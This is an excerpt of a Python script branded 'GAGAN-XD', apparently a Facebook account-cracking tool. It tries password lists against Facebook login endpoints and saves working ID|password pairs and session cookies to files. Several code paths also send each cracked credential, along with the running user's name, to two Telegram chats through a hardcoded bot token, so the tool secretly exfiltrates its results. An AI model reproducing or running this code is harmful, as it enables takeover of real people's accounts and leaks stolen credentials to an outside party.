...
# CODER FROM GAGAN
# SAY THE NAME THE GAGAN THE CODERR
# JAI GAGAN , GAGAN BOLKE KAM MAT SAMAJNA TERA BAP HE GAGAN
...
\033[1;37m-------------------------------------------
\33[1;93m  FACEBOOK : GAGAN BHANDARI
\33[1;93m WELCOME  TO  GAGAN  WORLD
 CREATED  BY  ONE  AND  ONLY  GAGAN-XD
\033[1;37m-------------------------------------------""")
...
id=[]
tokenku=[]
sys.stdout.write('\x1b]2; GAGAN THE LORD\x07')
        ...
        try:
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                if cpok in ['1','01']:
                                    clear()
                                    open('/sdcard/GAGAN-OK.txt', 'a')
                                    animation(' \033[1;37m[\u001b[36m•\033[1;37m] SHOWING OK IDz')
                                    print('---------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/GAGAN-OK.txt', 'r') as okids:
                                        okid = okids.read()
                                    ...
                                    clear()
                                    open('/sdcard/GAGAN-CP.txt', 'a')
                                    print(' \033[1;37m[\u001b[36m•\033[1;37m] SHOWING CP IDz')
                                    print('---------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/GAGAN-CP.txt', 'r') as cpids:
                                        cpid = cpids.read()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m \33[1;92m[GAGAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        GAGAN=session.cookies.get_dict().keys()
                        if "c_user" in GAGAN:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [GAGAN-OK] %s | %s'%(ids,pas))
                                print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                open('/sdcard/GAGAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                ...
                                oks.append(ids)
                                break
                        elif 'checkpoint' in GAGAN:
                                if 'y' in pcp:
                                        print('\r\r\x1b\033[1;33m \33[1;93m[GAGAN-CP] '+ids+' | '+pas+'\033[1;33m')
                                        open('/sdcard/GAGAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [GAGAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [GAGAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                        open('/sdcard/GAGAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=5899039629&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6221197589&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[\033[1;33m [GAGAN-CP] '+ids+' | '+pas+'\033[1;33m')
                                                open('/sdcard/GAGAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/GAGAN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [GAGAN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                                        open('/sdcard/GAGAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=5899039629&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                                        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6221197589&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                                        oks.append(ids)
                                                        break
